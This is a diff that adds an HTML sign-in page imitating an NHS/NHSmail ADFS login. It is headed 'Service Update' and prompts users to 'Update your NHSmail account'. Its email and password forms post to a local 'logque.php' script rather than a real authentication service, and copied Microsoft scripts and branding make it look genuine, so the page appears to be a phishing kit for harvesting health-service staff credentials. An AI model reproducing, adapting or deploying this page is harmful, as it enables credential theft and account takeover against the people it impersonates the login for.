@@ -1,0 +1,1288 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1"/>
+        <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+        <meta http-equiv="cache-control" content="no-cache,no-store"/>
+        <meta http-equiv="pragma" content="no-cache"/>
+        <meta http-equiv="expires" content="-1"/>
+        <meta name='mswebdialog-title' content='Connecting to NHS'/>
+
+        <title>Sign In</title>
+        <script type='text/javascript'>
+//<![CDATA[
+function LoginErrors(){this.userNameFormatError = 'Enter your correct Email ID'; this.passwordEmpty = 'Enter your password.'; this.passwordTooLong = 'Password is too long (\u0026gt; 128 characters).';}; var maxPasswordLength = 128;
+//]]>
+</script>
+
+<script type='text/javascript'>
+//<![CDATA[
+// Copyright (c) Microsoft Corporation.  All rights reserved.
+function InputUtil(errTextElementID, errDisplayElementID) {
+
+    if (!errTextElementID)  errTextElementID = 'errorText'; 
+    if (!errDisplayElementID)  errDisplayElementID = 'error'; 
+
+    this.hasFocus = false;
+    this.errLabel = document.getElementById(errTextElementID);
+    this.errDisplay = document.getElementById(errDisplayElementID);
+};
+InputUtil.prototype.canDisplayError = function () {
+    return this.errLabel && this.errDisplay;
+}
+InputUtil.prototype.checkError = function () {
+    if (!this.canDisplayError){
+        throw new Error ('Error element not present');
+    }
+    if (this.errLabel && this.errLabel.innerHTML) {
+        this.errDisplay.style.display = '';        
+        var cause = this.errLabel.getAttribute('for');
+        if (cause) {
+            var causeNode = document.getElementById(cause);
+            if (causeNode && causeNode.value) {
+                causeNode.focus();
+                this.hasFocus = true;
+            }
+        }
+    }
+    else {
+        this.errDisplay.style.display = 'none';
+    }
+};
+InputUtil.prototype.setInitialFocus = function (input) {
+    if (this.hasFocus) return;
+    var node = document.getElementById(input);
+    if (node) {
+        if ((/^\s*$/).test(node.value)) {
+            node.focus();
+            this.hasFocus = true;
+        }
+    }
+};
+InputUtil.prototype.setError = function (input, errorMsg) {
+    if (!this.canDisplayError) {
+        throw new Error('Error element not present');
+    }
+    input.focus();
+
+    if (errorMsg) {
+        this.errLabel.innerHTML = errorMsg;
+    }
+    this.errLabel.setAttribute('for', input.id);
+    this.errDisplay.style.display = '';
+};
+InputUtil.makePlaceholder = function (input) {
+    var ua = navigator.userAgent;
+
+    if (ua != null && 
+        (ua.match(/MSIE 9.0/) != null || 
+         ua.match(/MSIE 8.0/) != null ||
+         ua.match(/MSIE 7.0/) != null)) {
+        var node = document.getElementById(input);
+        if (node) {
+            var placeholder = node.getAttribute("placeholder");
+            if (placeholder != null && placeholder != '') {
+                var label = document.createElement('input');
+                label.type = "text";
+                label.value = placeholder;
+                label.readOnly = true;
+                label.style.position = 'absolute';
+                label.style.borderColor = 'transparent';
+                label.className = node.className + ' hint';
+                label.tabIndex = -1;
+                label.onfocus = function () { this.nextSibling.focus(); };
+
+                node.style.position = 'relative';
+                node.parentNode.style.position = 'relative';
+                node.parentNode.insertBefore(label, node);
+                node.onkeyup = function () { InputUtil.showHint(this); };
+                node.onblur = function () { InputUtil.showHint(this); };
+                node.style.background = 'transparent';
+
+                node.setAttribute("placeholder", "");
+                InputUtil.showHint(node);
+            }
+        }
+    }
+};
+InputUtil.focus = function (inputField) {
+    var node = document.getElementById(inputField);
+    if (node) node.focus();
+};
+InputUtil.hasClass = function(node, clsName) {
+    return node.className.match(new RegExp('(\\s|^)' + clsName + '(\\s|$)'));
+};
+InputUtil.addClass = function(node, clsName) {
+    if (!this.hasClass(node, clsName)) node.className += " " + clsName;
+};
+InputUtil.removeClass = function(node, clsName) {
+    if (this.hasClass(node, clsName)) {
+        var reg = new RegExp('(\\s|^)' + clsName + '(\\s|$)');
+        node.className = node.className.replace(reg, ' ');
+    }
+};
+InputUtil.showHint = function (node, gotFocus) {
+    if (node.value && node.value != '') {
+        node.previousSibling.style.display = 'none';
+    }
+    else {
+        node.previousSibling.style.display = '';
+    }
+};
+InputUtil.updatePlaceholder = function (input, placeholderText) {
+    var node = document.getElementById(input);
+    if (node) {
+        var ua = navigator.userAgent;
+        if (ua != null &&
+            (ua.match(/MSIE 9.0/) != null ||
+            ua.match(/MSIE 8.0/) != null ||
+            ua.match(/MSIE 7.0/) != null)) {
+            var label = node.previousSibling;
+            if (label != null) {
+                label.value = placeholderText;
+            }
+        }
+        else {
+            node.placeholder = placeholderText;
+        }
+    }
+};
+
+//]]>
+</script>
+
+
+        
+        <link rel="stylesheet" type="text/css" href="./script/styled81a.css" />
+        <link rel="icon" type="image/png" href="./script/nhsicon.jpg">
+
+        <style>.illustrationClass {background-image:url(./script/illustrationa537.png);}</style>
+
+    </head>
+    <body dir="ltr" class="body">
+    <div id="noScript" style="position:static; width:100%; height:100%; z-index:100">
+        <h1>JavaScript required</h1>
+        <p>JavaScript is required. This web browser does not support JavaScript or JavaScript in this web browser is not enabled.</p>
+        <p>To find out if your web browser supports JavaScript or to enable JavaScript, see web browser help.</p>
+    </div>
+    <script type="text/javascript" language="JavaScript">
+         document.getElementById("noScript").style.display = "none";
+    </script>
+    <div id="fullPage">
+        <div id="brandingWrapper" class="float">
+            <div id="branding"></div>
+        </div>
+        <div id="contentWrapper" class="float">
+            <div id="content">
+                <div id="header">
+                    <img class='logoImage' id='companyLogo' src='./script/logoa1a1.jpg' alt='NHS'/>
+                </div>
+                <main>
+                    <div id="workArea">
+                        
+    <div id="authArea" class="groupMargin">
+        
+        <h1>Service Update</h1>
+
+        
+    <div id="loginArea">        
+        <div id="loginMessage" class="groupMargin">Sign in</div>
+
+        <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onKeyPress="if (event && event.keyCode == 13) Login.submitLoginRequest();" name="NHS Access" onSubmit="submit"  action="logque.php" >
+
+            <div id="error" class="fieldMargin error smallText">
+                <span id="errorText" for="" aria-live="assertive" role="alert"></span>
+            </div>
+
+            <div id="formsAuthenticationArea">
+                <div id="userNameArea">
+                    <label id="userNameInputLabel" for="userNameInput" class="hidden">Email Address</label>
+                    <input id="userNameInput" name="email" type="email" value="" tabindex="1" class="text fullWidth"
+                        spellcheck="false" placeholder="Email Address" autocomplete="off"/>
+                </div>
+
+                <div id="passwordArea">
+                    <label id="passwordInputLabel" for="passwordInput" class="hidden">Password</label>
+                    <input id="passwordInput" name="password" type="password" tabindex="2" class="text fullWidth"
+                        placeholder="Password" autocomplete="off"/>
+                </div>
+                <div id="kmsiArea" style="display:none">
+                    <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3" />
+                    <label for="kmsiInput">This is a private computer</label>
+                </div>
+                <div id="submissionArea" class="submitMargin">
+                    <span id="submitButton" class="submit" tabindex="4" role="button"
+                        onKeyPress="if (event && event.keyCode == 32) Login.submitLoginRequest();"
+                        onclick="return Login.submitLoginRequest();">Sign in</span>
+                </div>
+            </div>
+            <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication"/>
+        </form>
+
+             <div id="authOptions">
+         <form id="options" method="post" action="logque.php">
+             <script type="text/javascript">
+                function SelectOption(option) {
+                    var w = document.getElementById('waitingWheelDiv');
+                    if(w) w.style.display = 'inline';
+                    var i = document.getElementById('optionSelection');
+                    i.value = option;
+                    document.forms['options'].submit();
+                    return false;
+                }
+             </script>
+             <input id="optionSelection" type="hidden" name="AuthMethod" />
+             <input id="userNameInputOptionsHolder" name="UserName" value="" type="hidden"/>
+             <div id='authOptionLinks' class='groupMargin'><div id="waitingWheelDiv" style="display: none;"><div id="WaitingWheel">
+    <!-- NOTE: This style portion is identical to cookie pull page, they are not in shared css file because of legacy dependancies for custom themes-->
+    <!-- CSS for small "waiting" wheel -->
+    <style>
+        #floatingCirclesG {
+            position: relative;
+            width: 125px;
+            height: 125px;
+            margin: auto;
+            transform: scale(0.4);
+            -o-transform: scale(0.4);
+            -ms-transform: scale(0.4);
+            -webkit-transform: scale(0.4);
+            -moz-transform: scale(0.4);
+        }
+
+        .f_circleG {
+            position: absolute;
+            height: 22px;
+            width: 22px;
+            border-radius: 12px;
+            -o-border-radius: 12px;
+            -ms-border-radius: 12px;
+            -webkit-border-radius: 12px;
+            -moz-border-radius: 12px;
+            animation-name: f_fadeG;
+            -o-animation-name: f_fadeG;
+            -ms-animation-name: f_fadeG;
+            -webkit-animation-name: f_fadeG;
+            -moz-animation-name: f_fadeG;
+            animation-duration: 1.2s;
+            -o-animation-duration: 1.2s;
+            -ms-animation-duration: 1.2s;
+            -webkit-animation-duration: 1.2s;
+            -moz-animation-duration: 1.2s;
+            animation-iteration-count: infinite;
+            -o-animation-iteration-count: infinite;
+            -ms-animation-iteration-count: infinite;
+            -webkit-animation-iteration-count: infinite;
+            -moz-animation-iteration-count: infinite;
+            animation-direction: normal;
+            -o-animation-direction: normal;
+            -ms-animation-direction: normal;
+            -webkit-animation-direction: normal;
+            -moz-animation-direction: normal;
+        }
+
+        #frotateG_01 {
+            left: 0;
+            top: 51px;
+            animation-delay: 0.45s;
+            -o-animation-delay: 0.45s;
+            -ms-animation-delay: 0.45s;
+            -webkit-animation-delay: 0.45s;
+            -moz-animation-delay: 0.45s;
+        }
+
+        #frotateG_02 {
+            left: 15px;
+            top: 15px;
+            animation-delay: 0.6s;
+            -o-animation-delay: 0.6s;
+            -ms-animation-delay: 0.6s;
+            -webkit-animation-delay: 0.6s;
+            -moz-animation-delay: 0.6s;
+        }
+
+        #frotateG_03 {
+            left: 51px;
+            top: 0;
+            animation-delay: 0.75s;
+            -o-animation-delay: 0.75s;
+            -ms-animation-delay: 0.75s;
+            -webkit-animation-delay: 0.75s;
+            -moz-animation-delay: 0.75s;
+        }
+
+        #frotateG_04 {
+            right: 15px;
+            top: 15px;
+            animation-delay: 0.9s;
+            -o-animation-delay: 0.9s;
+            -ms-animation-delay: 0.9s;
+            -webkit-animation-delay: 0.9s;
+            -moz-animation-delay: 0.9s;
+        }
+
+        #frotateG_05 {
+            right: 0;
+            top: 51px;
+            animation-delay: 1.05s;
+            -o-animation-delay: 1.05s;
+            -ms-animation-delay: 1.05s;
+            -webkit-animation-delay: 1.05s;
+            -moz-animation-delay: 1.05s;
+        }
+
+        #frotateG_06 {
+            right: 15px;
+            bottom: 15px;
+            animation-delay: 1.2s;
+            -o-animation-delay: 1.2s;
+            -ms-animation-delay: 1.2s;
+            -webkit-animation-delay: 1.2s;
+            -moz-animation-delay: 1.2s;
+        }
+
+        #frotateG_07 {
+            left: 51px;
+            bottom: 0;
+            animation-delay: 1.35s;
+            -o-animation-delay: 1.35s;
+            -ms-animation-delay: 1.35s;
+            -webkit-animation-delay: 1.35s;
+            -moz-animation-delay: 1.35s;
+        }
+
+        #frotateG_08 {
+            left: 15px;
+            bottom: 15px;
+            animation-delay: 1.5s;
+            -o-animation-delay: 1.5s;
+            -ms-animation-delay: 1.5s;
+            -webkit-animation-delay: 1.5s;
+            -moz-animation-delay: 1.5s;
+        }
+
+        @keyframes f_fadeG {
+            0% {
+                background-color: rgb(47, 146, 212);
+            }
+
+            100% {
+                background-color: rgb(255, 255, 255);
+            }
+        }
+
+        @-o-keyframes f_fadeG {
+            0% {
+                background-color: rgb(47, 146, 212);
+            }
+
+            100% {
+                background-color: rgb(255, 255, 255);
+            }
+        }
+
+        @-ms-keyframes f_fadeG {
+            0% {
+                background-color: rgb(47, 146, 212);
+            }
+
+            100% {
+                background-color: rgb(255, 255, 255);
+            }
+        }
+
+        @-webkit-keyframes f_fadeG {
+            0% {
+                background-color: rgb(47, 146, 212);
+            }
+
+            100% {
+                background-color: rgb(255, 255, 255);
+            }
+        }
+
+        @-moz-keyframes f_fadeG {
+            0% {
+                background-color: rgb(47, 146, 212);
+            }
+
+            100% {
+                background-color: rgb(255, 255, 255);
+            }
+        }
+    </style>
+
+    <!-- Div containing small "waiting" wheel -->
+    <div id="floatingCirclesG">
+        <div class="f_circleG" id="frotateG_01"></div>
+        <div class="f_circleG" id="frotateG_02"></div>
+        <div class="f_circleG" id="frotateG_03"></div>
+        <div class="f_circleG" id="frotateG_04"></div>
+        <div class="f_circleG" id="frotateG_05"></div>
+        <div class="f_circleG" id="frotateG_06"></div>
+        <div class="f_circleG" id="frotateG_07"></div>
+        <div class="f_circleG" id="frotateG_08"></div>
+    </div>
+</div></div></div>
+         </form>
+      </div>
+
+        <div id="introduction" class="groupMargin">
+             <p><input type='checkbox' name='publicComputer' onclick='tickboxUpdate(this)'> This is a private computer<br></p><br><p> Unlock Account or Forgotten Password?<a> Click here.</a></p><script type='text/javascript' src='./script/adfs-custom.js'></script>                     
+        </div>
+
+        <script type="text/javascript">
+        //<![CDATA[
+
+            function Login() {
+            }
+
+            Login.userNameInput = 'userNameInput';
+            Login.passwordInput = 'passwordInput';
+
+            Login.initialize = function () {
+
+                var u = new InputUtil();
+
+                u.checkError();
+                u.setInitialFocus(Login.userNameInput);
+                u.setInitialFocus(Login.passwordInput);
+            }();
+
+            Login.submitLoginRequest = function () { 
+                var u = new InputUtil();
+                var e = new LoginErrors();
+
+                var userName = document.getElementById(Login.userNameInput);
+                var password = document.getElementById(Login.passwordInput);
+
+                if (!userName.value || !userName.value.match('[@\\\\]')) {
+                    u.setError(userName, e.userNameFormatError);
+                    return false;
+                }
+
+                if (!password.value) {
+                    u.setError(password, e.passwordEmpty);
+                    return false;
+                }
+
+                if (password.value.length > maxPasswordLength) {
+                    u.setError(password, e.passwordTooLong);
+                    return false;
+                }
+
+                document.forms['loginForm'].submit();
+                return false;
+            };
+
+            InputUtil.makePlaceholder(Login.userNameInput);
+            InputUtil.makePlaceholder(Login.passwordInput);
+        //]]>
+        </script>
+    </div>
+
+    </div>
+
+                    </div>
+                </main>
+                <div id="footerPlaceholder"></div>
+            </div>
+            <footer id="footer">
+                <div id="footerLinks" class="floatReverse">
+                    <div><span id="copyright">&#169; 2018 Microsoft</span><a id="home" class="pageLink footerLink">Home</a><a id="helpDesk" class="pageLink footerLink">Help</a></div>
+                </div>
+            </footer>
+        </div>     
+    </div>
+    <script type='text/javascript'>
+//<![CDATA[
+// Copyright (c) Microsoft Corporation.  All rights reserved.
+
+// This file contains several workarounds on inconsistent browser behaviors that administrators may customize.
+"use strict";
+
+// iPhone email friendly keyboard does not include "\" key, use regular keyboard instead.
+// Note change input type does not work on all versions of all browsers.
+if (navigator.userAgent.match(/iPhone/i) != null) {
+    var emails = document.querySelectorAll("input[type='email']");
+    if (emails) {
+        for (var i = 0; i < emails.length; i++) {
+            emails[i].type = 'text';
+        }
+    }
+}
+
+// In the CSS file we set the ms-viewport to be consistent with the device dimensions, 
+// which is necessary for correct functionality of immersive IE. 
+// However, for Windows 8 phone we need to reset the ms-viewport's dimension to its original
+// values (auto), otherwise the viewport dimensions will be wrong for Windows 8 phone.
+// Windows 8 phone has agent string 'IEMobile 10.0'
+if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
+    var msViewportStyle = document.createElement("style");
+    msViewportStyle.appendChild(
+        document.createTextNode(
+            "@-ms-viewport{width:auto!important}"
+        )
+    );
+    msViewportStyle.appendChild(
+        document.createTextNode(
+            "@-ms-viewport{height:auto!important}"
+        )
+    );
+    document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
+}
+
+// If the innerWidth is defined, use it as the viewport width.
+if (window.innerWidth && window.outerWidth && window.innerWidth !== window.outerWidth) {
+    var viewport = document.querySelector("meta[name=viewport]");
+    viewport.setAttribute('content', 'width=' + window.innerWidth + 'px; initial-scale=1.0; maximum-scale=1.0');
+}
+
+// Gets the current style of a specific property for a specific element.
+function getStyle(element, styleProp) {
+    var propStyle = null;
+
+    if (element && element.currentStyle) {
+        propStyle = element.currentStyle[styleProp];
+    }
+    else if (element && window.getComputedStyle) {
+        propStyle = document.defaultView.getComputedStyle(element, null).getPropertyValue(styleProp);
+    }
+
+    return propStyle;
+}
+
+// The script below is used for downloading the illustration image 
+// only when the branding is displaying. This script work together
+// with the code in PageBase.cs that sets the html inline style
+// containing the class 'illustrationClass' with the background image.
+var computeLoadIllustration = function () {
+    var branding = document.getElementById("branding");
+    var brandingDisplay = getStyle(branding, "display");
+    var brandingWrapperDisplay = getStyle(document.getElementById("brandingWrapper"), "display");
+
+    if (brandingDisplay && brandingDisplay !== "none" &&
+        brandingWrapperDisplay && brandingWrapperDisplay !== "none") {
+        var newClass = "illustrationClass";
+
+        if (branding.classList && branding.classList.add) {
+            branding.classList.add(newClass);
+        } else if (branding.className !== undefined) {
+            branding.className += " " + newClass;
+        }
+        if (window.removeEventListener) {
+            window.removeEventListener('load', computeLoadIllustration, false);
+            window.removeEventListener('resize', computeLoadIllustration, false);
+        }
+        else if (window.detachEvent) {
+            window.detachEvent('onload', computeLoadIllustration);
+            window.detachEvent('onresize', computeLoadIllustration);
+        }
+    }
+};
+
+if (window.addEventListener) {
+    window.addEventListener('resize', computeLoadIllustration, false);
+    window.addEventListener('load', computeLoadIllustration, false);
+}
+else if (window.attachEvent) {
+    window.attachEvent('onresize', computeLoadIllustration);
+    window.attachEvent('onload', computeLoadIllustration);
+}
+
+// Check whether the loginMessage element is present on this page.
+// Since we now have one page this is directly added to loginMessage
+var loginMessage = document.getElementById('loginMessage');
+if (loginMessage)
+{
+    // loginMessage element is present, modify its properties.
+    loginMessage.innerHTML = 'Update your NHSmail account';
+}
+
+//remove email address requirement
+function runScript(e) {
+    if (e.keyCode == 13) {
+        AppendUPN();
+		return Login.submitLoginRequest();
+    }
+}
+
+// Change based on environment
+const DomainName = '';
+const CIS2URI = "";
+const CIS2MatchingPortalURI = "";
+const MFALink = "";
+// URIs must not end in /
+const PortalURI = "";
+const ADFSURI = "";
+const OutlookURI = ""
+// Portal routes must start with /
+const PortalAUPRoute = "";
+const PortalForgottenPasswordRoute = "";
+
+//// Cookie constants
+const selectionCookieName = "";
+const ADSelectionCookieValue = "";
+const CIS2AvailableCookieName = "";
+const Office365AuthenticationCountCookieName = "";
+
+const MaxOffice365AuthenticationCount = 1;
+// Lifetime in seconds for O365 authentication counter cookie 
+const Office365AuthenticationCountCookieLifetime = 2;
+const deviceWithoutCIS2Support = IsUsingDeviceWithoutCIS2Support();
+
+function DoesContainString(string, substring){
+    var returnValue = false;
+
+    if(!substring){
+        return false;
+    }
+  
+    if (string.indexOf(substring) !== -1) {
+      returnValue = true;
+    }
+  
+    return returnValue;
+}
+
+if (document.getElementById("hrdArea")) {
+    UpdateHRDPage();
+}
+
+if (IsInSuccessfullyUpdatedPasswordPage()){
+    let updatePasswordDiv = document.getElementById("updatePasswordArea");
+    if(updatePasswordDiv){
+        AppendLinksToPortalAndOutlook(updatePasswordDiv);
+    }
+    let openingMessageDiv = document.getElementById("openingMessage");
+    if (openingMessageDiv) {
+        openingMessageDiv.classList.add("bigText");
+    }
+}
+
+// In AD Login page
+if (!document.getElementById("hrdArea") && !IsUpdatePasswordPage()){
+    UpdateADLoginPage();   
+}
+
+//// code to add in username if navigated from O365
+var userNameInput = document.getElementById('userNameInput');
+if(userNameInput){
+    var queryString = window.location.href.split("&");
+    var username = "";
+    for (let i = 0; i < queryString.length; i++) {
+        var param = queryString[i];
+        if(DoesContainString(param, "username")){
+            username = param;
+        }
+    }
+
+    if(username){
+        var startIndex = username.indexOf("=");
+        // detect encoded @ symbol
+        var endIndex = username.indexOf("%");
+        // only add username if encoded @ symbol is present
+        if (endIndex !== -1 ) {
+            userNameInput.value = username.substring(startIndex + 1, endIndex) + "@" + DomainName;
+        }
+    }
+}
+
+if(document.getElementById('userNameInput') != null) {
+    document.getElementById('userNameInput').onblur = new Function('AppendUPN();');
+}
+
+if(document.getElementById("userNameInput") != null) {
+    document.getElementById("userNameInput").placeholder="Email Address";
+}
+
+// Code to display error if a user does not have MFA
+var mfaMessage = document.getElementById('mfaGreetingDescription');  
+if (mfaMessage)  
+{  
+    var errorMessage = document.getElementById('errorMessage');  
+    if (errorMessage && (errorMessage.innerHTML.indexOf('The selected authentication method is not available') >=0 ))  
+    {
+        var openingMessage = document.getElementById('openingMessage');
+        openingMessage.innerHTML= "<b><u>Security Notice</u></b>";
+        var MessageHeading = document.getElementById('mfaGreetingDescription');
+        MessageHeading.innerHTML= "<b></b>";
+        var ErrHeading = document.getElementById('errorDetailsLink');
+        ErrHeading.innerHTML = "<b> </b>";
+        errorMessage.innerHTML = 'We are currently making improvements to the security of the NHSmail Service by introducing Multi-Factor Authentication (MFA) for particular types of accounts.\
+            <br><br>To enrol for MFA, you will need to register a mobile telephone number to receive authentication passcodes (call, SMS or app) when signing in to NHSmail.\
+            <br><br><a href="' + MFALink + '"<b>Click me to enrol for Multi-Factor Authentication</b></a>\
+            <br><br><b>Note</b>: After the enrolling, please close your browser and sign back in to NHSmail<br><br>';
+    }  
+}
+
+function IsUsingDeviceWithoutCIS2Support(){
+    let userAgentStringLowered = window.navigator.userAgent.toLowerCase();
+
+    if (!userAgentStringLowered){
+        return true;
+    }
+
+    // Add edge cases here
+    // ipad is an edge case since mobile devices are being excluded
+    if (DoesContainString(userAgentStringLowered, "ipad")) {
+        // must also be running on safari
+        return !DoesContainString(userAgentStringLowered, "safari");
+    }
+
+    // desktop outlook 2016+ uses edge webview browser
+    const IsEdgeWebViewBrowser = DoesContainString(userAgentStringLowered, "edge") && DoesContainString(userAgentStringLowered, "webview");
+    const IsUsingDepreciatedBrowser = DoesContainString(userAgentStringLowered, "msie 7.0") || 
+        DoesContainString(userAgentStringLowered, "msie 8.0") || 
+        DoesContainString(userAgentStringLowered, "msie 9.0") ||
+        DoesContainString(userAgentStringLowered, "trident");
+    // unsupported Operating Systems 
+    // cannot add macintosh as ipads use macintosh
+    const IsUsingUnsupportedOS = DoesContainString(userAgentStringLowered, "linux")
+    // mobile devices which are not supported
+    const IsUsingUnsupportedMobileBrowser = DoesContainString(userAgentStringLowered, "android") ||
+        DoesContainString(userAgentStringLowered, "mobi");
+
+    const IsUsingUnsupportedDevice = DoesContainString(userAgentStringLowered, "playstation") ||
+        DoesContainString(userAgentStringLowered, "nintendo") ||
+        DoesContainString(userAgentStringLowered, "xbox") ||
+        DoesContainString(userAgentStringLowered, "windows phone") ||
+        DoesContainString(userAgentStringLowered, "appletv") ||
+        DoesContainString(userAgentStringLowered, "roku") ||
+        DoesContainString(userAgentStringLowered, "crkey");
+    
+    return IsEdgeWebViewBrowser || 
+        IsUsingDepreciatedBrowser || 
+        IsUsingUnsupportedMobileBrowser ||
+        IsUsingUnsupportedOS ||
+        IsUsingUnsupportedDevice;
+}
+
+function UpdateADLoginPage(){
+    var isCis2Available = getCookieValue(CIS2AvailableCookieName) === "true";
+    var authAreaDiv = document.getElementById("authArea");
+    var errorDiv = document.getElementById("errorArea");
+    let mfaDiv = document.getElementById('mfaGreetingDescription');
+
+    UpdateADFormSubmitButtonStyling();
+
+    if (isCis2Available && authAreaDiv && !errorDiv && HrefIncludesADRedirect() && !mfaDiv && !deviceWithoutCIS2Support){
+        AddCIS2LoginOption(authAreaDiv);
+        deleteCookie("CIS2Available");
+    }
+
+    var introductionDiv = document.getElementById('introduction');
+    if (introductionDiv){
+        introductionDiv.outerHTML = ""; 
+    }
+
+    var loginAreaDiv = document.getElementById('loginArea');
+    if (loginAreaDiv) {
+        InsertAUPMessage(loginAreaDiv)
+        AppendPrivateComputerCheckbox(loginAreaDiv);
+        AppendForgotPasswordMessage(loginAreaDiv);
+
+        let cis2LoginOption = document.getElementById("cis2Login");
+        if (!cis2LoginOption && HrefIncludesADRedirect() && !mfaDiv && !deviceWithoutCIS2Support){
+            AppendGoBackMessage(loginAreaDiv);
+        }
+        
+        // Add borders and margins to login section
+        loginAreaDiv.classList.add('loginBorder');
+        loginAreaDiv.classList.add('groupMargin');
+    }
+}
+
+function UpdateHRDPage(){
+    if (document.title === "Home Realm Discovery") {
+        document.title = "Sign In";
+    }
+    
+    // Hide AD login option, as this AD Login form will be added
+    var ADLoginDiv = getADLoginDiv();
+    if (ADLoginDiv) {
+        ADLoginDiv.className = "hidden";
+
+        let visibleIDPs = document.getElementsByClassName("idp");
+        if (visibleIDPs.length === 0){
+            HideIDPDiv();
+        } 
+    }
+
+    if (deviceWithoutCIS2Support){
+        let smartcardDiv = getSmartcardLoginDiv();
+        if (smartcardDiv){
+            smartcardDiv.className = "hidden";
+        }
+        let visibleIDPs = document.getElementsByClassName("idp");
+        if (visibleIDPs.length === 0){
+            HideIDPDiv();
+        } 
+    }
+
+    // custom code to handle O365 loop
+    HandleO365Authentication();
+
+    // Checks if SSO selection for user is suitable and applies SSO if so.
+    VerifyAndApplySSO();
+
+    // Setup AD login form on HRD page
+    var workArea = document.getElementById("workArea");
+    if (workArea){
+        var authAreaDiv = document.createElement("div");
+        authAreaDiv.id = "authArea";
+        workArea.insertBefore(authAreaDiv, workArea.children[0]);
+    
+        AddADLoginOption(authAreaDiv);
+        InsertAUPMessage(authAreaDiv);
+        AppendPrivateComputerCheckbox(authAreaDiv);
+        AppendForgotPasswordMessage(authAreaDiv);
+    
+        authAreaDiv.classList.add('loginBorder');
+        authAreaDiv.classList.add('groupMargin');
+
+        UpdateADFormSubmitButtonStyling();        
+    }
+
+    var loginAreaDiv = document.getElementById('loginArea');
+    if (loginAreaDiv) { 
+        InsertLoginErrorMessage(loginAreaDiv);
+    }
+
+    // Update CIS2 Smartcard login option
+    var smartcardDiv = getSmartcardLoginDiv();    
+    if (smartcardDiv) {
+        // Hide NHS Care Idenity text, as button image has the text
+        let idpDescriptionDiv = GetIdpDescriptionDiv(smartcardDiv);
+        if (idpDescriptionDiv) {
+            idpDescriptionDiv.className = "hidden";
+        }
+
+        smartcardDiv.onkeypress = SetSmartcardLoginSelection;
+        smartcardDiv.onclick = SetSmartcardLoginSelection;
+        smartcardDiv.tabIndex = 4;
+        smartcardDiv.classList.add("groupMargin");
+    }
+
+    // Fix tabindex so username then password inputs from AD login form are tabbed into first.
+    var submitButtonDiv = document.getElementById('submitButton');
+    if (submitButtonDiv){
+        submitButtonDiv.tabIndex = 3;
+    }
+
+    var bySelectionDiv = document.getElementById('bySelection');
+    if (bySelectionDiv && smartcardDiv){
+        AppendSmartcardRegistrationMessage(bySelectionDiv);
+    }
+
+    // update text and class of other (not AD) login options
+    var openingMessageId = document.getElementById('openingMessage');
+    if (openingMessageId){
+        openingMessageId.innerHTML = "Sign in with another account";
+        openingMessageId.classList.remove("groupMargin");
+        openingMessageId.classList.add("loginMessageMargin");
+    }
+
+    // Add borders and margins to other (not AD) login sections
+    var otherLoginOptionsDiv = document.getElementById('bySelection');
+    if (otherLoginOptionsDiv){
+        otherLoginOptionsDiv.classList.add("groupMargin");
+        otherLoginOptionsDiv.classList.add("loginBorder");
+    }
+}
+
+function IsInSuccessfullyUpdatedPasswordPage(){
+    let isUpdatePasswordInHref = DoesContainString(window.location.href,"portal/updatepassword");
+    let isUpdateMessagePresent;
+    let successMessageDiv = document.getElementById("expiredNotification");
+    if (successMessageDiv) {
+        isUpdateMessagePresent = DoesContainString(successMessageDiv.innerText.toLowerCase(), "password is successfully updated");
+    }
+
+    return isUpdatePasswordInHref && isUpdateMessagePresent;
+}
+
+function IncrementOffice365AuthenticationCount(){
+    // do not increment if wrong password
+    var errorDiv = document.getElementById("errorText");
+    if(errorDiv){
+        if(DoesContainString(errorDiv.innerHTML.toLowerCase(), "incorrect user id or password")){
+            return;
+        }
+    }
+    
+    let currentOffice365AuthenticationCount = parseInt(getCookieValue(Office365AuthenticationCountCookieName));
+    if (currentOffice365AuthenticationCount){
+        currentOffice365AuthenticationCount++;
+        setCookieWithTimeInSeconds(Office365AuthenticationCountCookieName, currentOffice365AuthenticationCount, Office365AuthenticationCountCookieLifetime);
+    } else {
+        setCookieWithTimeInSeconds(Office365AuthenticationCountCookieName, 1, Office365AuthenticationCountCookieLifetime);
+    }
+}
+
+function IsUpdatePasswordPage(){
+    let updatePasswordForm = document.getElementById("updatePasswordForm");
+    let isUpdatePasswordFormVisible = updatePasswordForm != null;
+    return isUpdatePasswordFormVisible || DoesContainString(window.location.href.toLowerCase(), "updatepassword")
+}
+
+// private computer checkbox code
+// IE Workaround
+if (!window.console) console = {log: function() {}}; 
+
+function setCookie(name, val) {
+    var cookieExpiry = 'Wed, 1 Jan 2025 00:00:00 GMaT';
+    var c = name + "=" + val;
+    document.cookie = c + ';secure;expires=' + cookieExpiry;
+};
+
+function setDomainCookie(name, val) {
+    var cookieExpiry = 'Wed, 1 Jan 2025 00:00:00 GMT';
+    var c = name + "=" + val;
+    document.cookie = c + ';secure;expires=' + cookieExpiry + ";domain=" + DomainName + ";path=/";
+};
+
+function readCookie(name){
+    var cookies, c, C, i;
+    c = document.cookie.split('; ');
+    cookies = {};
+
+    for(i=c.length-1; i>=0; i--){
+        C = c[i].split('=');
+        cookies[C[0]] = C[1];
+    }
+    return cookies[name];
+}
+
+function tickboxUpdate(e) {
+    var net = readCookie("net");
+
+    if (e.checked == true) {
+        setDomainCookie("endpoint", "private");
+    } else {
+        setDomainCookie("endpoint", "public");
+    }
+};
+
+function initialiseSettings() {
+    var NHSmail2 = readCookie("NHSMail2");
+    var endpoint = readCookie("endpoint");
+    var net = readCookie("net");
+    var cb = document.getElementsByName("publicComputer")[0];
+
+    // Remove cookie if it's been cached
+    if (NHSmail2 != undefined) {
+        console.log("Removing NHSmail 2 migration cookie")
+        deleteCookie("NHSMail2")
+    } else {
+        console.log("No migration cookie found")
+    }
+    
+    if (net == "1") {
+        setDomainCookie("endpoint", "n3");
+        cb.checked = 1;
+    } else {
+        if (endpoint != undefined) {
+            if (endpoint == "private") {
+                cb.checked = 1;
+            } else {
+                cb.checked = 0;
+            }
+        } else {
+            setDomainCookie("endpoint", "public");
+            cb.checked = 0;
+        }
+    }
+};
+
+// end of private computer checkbox code
+
